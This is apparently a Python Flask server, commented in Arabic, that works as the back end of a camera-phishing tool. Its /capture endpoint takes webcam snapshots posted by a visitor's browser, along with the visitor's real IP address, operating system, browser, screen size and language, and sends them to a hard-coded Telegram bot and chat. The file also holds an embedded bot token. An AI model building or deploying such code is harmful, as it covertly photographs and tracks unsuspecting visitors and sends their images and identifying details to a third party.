import os
import base64
import requests
from flask import Flask, request, jsonify, send_from_directory
from telebot import TeleBot
from datetime import datetime

app = Flask(__name__)

# ⚠️ تم إدراج التوكن ومعرف الدردشة مباشرة (استخدمها بحذر)
TOKEN = "8877750705:AAHSSXX_VU39r_LwcxvE9tB_xe3cTqL990A"
CHAT_ID = 821436485  # 🔴 هذا الرقم قد لا يكون صحيحًا - استخرجه من @userinfobot إذا لم تعمل الصور

bot = TeleBot(TOKEN)

@app.route('/')
def index():
    return send_from_directory('templates', 'index.html')

@app.route('/capture', methods=['POST'])
def capture():
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            return jsonify({"status": "error", "msg": "No image"}), 400

        img_data = base64.b64decode(data['image'].split(',')[1])

        # الحصول على IP الحقيقي
        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if client_ip and ',' in client_ip:
            client_ip = client_ip.split(',')[0].strip()

        device = data.get('device_info', {})
        os_name = device.get('os', 'غير معروف')
        browser = device.get('browser', 'غير معروف')
        screen = device.get('screen', 'غير معروف')
        language = device.get('language', 'غير معروف')

        msg = f"<b>📸 صورة من زائر الموقع</b>\n"
        msg += f"🌍 <b>IP:</b> <code>{client_ip}</code>\n"
        msg += f"💻 <b>نظام التشغيل:</b> {os_name}\n"
        msg += f"🌐 <b>المتصفح:</b> {browser}\n"
        msg += f"📱 <b>دقة الشاشة:</b> {screen}\n"
        msg += f"🗣️ <b>اللغة:</b> {language}\n"
        msg += f"🕒 <b>الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

        bot.send_photo(CHAT_ID, img_data, caption=msg, parse_mode='HTML')
        return jsonify({"status": "sent"})
    except Exception as e:
        print("❌ خطأ:", e)
        return jsonify({"status": "error", "msg": str(e)}), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
